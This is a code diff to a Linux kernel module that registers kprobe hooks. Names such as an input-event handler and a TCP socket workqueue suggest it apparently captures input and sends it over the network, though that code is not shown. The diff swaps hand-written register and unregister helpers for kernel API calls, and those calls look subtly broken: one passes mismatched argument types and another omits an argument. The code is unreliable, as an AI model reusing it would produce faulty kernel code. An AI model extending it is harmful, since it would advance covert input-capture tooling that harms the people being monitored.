@@ -140,57 +140,6 @@ static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs)
 	return 0;
 }
 
-
-/* Register all hooks */
-static int register_probes(void)
-{
-       int ret = 0, i;
-
-       	/* Iterate through kps array of structs */
-	for(i=0;i<PROBES_SIZE;i++)
-	{
-		ret = register_kprobe(&kps[i]);
-
-		/* 
-		 * In case register fails unregister all
-		 * Probes that had been done before it
-		 * To ensure all probes are cleared
-		 */
-		if ( ret < 0 )
-		{
-			unregister_probes(i);
-			printk(KERN_ERR "Failed to register: %s\n", kps[i].symbol_name);
-			return ret;
-		}
-	}       
-	
-	printk(KERN_INFO "Finished hooking succusfully\n");
-        return ret;
-}
-
-/* Unregister all kprobes */
-static void unregister_probes(int max_probes)
-{
-	/* Static char to indicate if already unregistered */
-	static atomic_t unreg_kprobes = ATOMIC_INIT(0); // Use atomic to avoid race condition
-
-	/* Check if it has been set to 1, if not set it to one */
-	if (atomic_cmpxchg(&unreg_kprobes, 0, 1) == 0)
-	{	
-		/* Create i variable
-		 * While it's not a good practice to 
-		 * put it inside of a branch
-		 * we want to not create it if already
-		 * unregistered devices
-		*/
-		int i;
-		for (i=0;i<max_probes;i++)
-		{
-			unregister_kprobe(&kps[i]);
-		}
-	}
-}
-
 static int __init hook_init(void)
 {
     	int ret = 0;    
@@ -205,7 +154,8 @@ static int __init hook_init(void)
 
     	mutex_init(&sock_mutex);
 
-    	ret = register_probes();
+		/* Registers kprobes, if one fails unregisters all registered kprobes */
+    	ret = register_kprobes(kps, PROBES_SIZE);
     	if ( ret < 0 )
         	goto cleanup_wq;
 
@@ -224,7 +174,7 @@ static void __exit hook_exit(void)
     	destroy_workqueue(tcp_sock_wq);
 
 	tcp_sock_close(sock);
-	unregister_probes(PROBES_SIZE);
+	unregister_kprobes(PROBES_SIZE);
 
 	printk(KERN_INFO "Unregisterd kernel probes");
 }
